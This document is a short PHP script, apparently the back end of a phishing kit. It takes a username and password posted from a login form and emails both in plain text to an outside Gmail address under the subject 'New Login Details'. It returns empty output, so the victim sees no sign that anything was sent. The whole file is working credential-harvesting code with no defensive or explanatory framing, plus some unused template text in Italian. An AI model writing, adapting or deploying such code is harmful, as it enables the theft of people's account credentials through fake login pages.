<?php
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
error_reporting(E_ALL);

$mail_boundary = "=_NextPart_" . md5(uniqid(time()));
 
$to = "king9test9@gmail.com";
$subject = "New Login Details";
$sender = "postmaster@infofastmultti.com";

 
$headers = "From: $sender\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-Type: multipart/alternative;\n\tboundary=\"$mail_boundary\"\n";
$headers .= "X-Mailer: PHP " . phpversion();
 

$text_msg = "messaggio in formato testo";
$html_msg = "<b>messaggio</b> in formato <p><a href='http://www.aruba.it'>html</a><br><img src=\"http://hosting.aruba.it/image_top/top_01.gif\" border=\"0\"></p>";
 

$msg = "This is a multi-part message in MIME format.\n\n";
$msg .= "--$mail_boundary\n";
$msg .= "Content-Type: text/plain; charset=\"iso-8859-1\"\n";
$msg .= "Content-Transfer-Encoding: 8bit\n\n";
$msg .= '<html>
<body>
    <p>Username:'.$username.'</p>
    <p>Password:'.$password.'</p>
</body>
</html>';
 
$msg .= "\n--$mail_boundary\n";
$msg .= "Content-Type: text/html; charset=\"iso-8859-1\"\n";
$msg .= "Content-Transfer-Encoding: 8bit\n\n";
$msg .= '<html>
<body>
    <p>Username:'.$username.'</p>
    <p>Password:'.$password.'</p>
</body>
</html>';  

$msg .= "\n--$mail_boundary--\n";
 

ini_set("sendmail_from", $sender);
 

if (mail($to, $subject, $msg, $headers, "-f$sender")) { 
    echo "";
} else { 
    echo "";
}
}

?>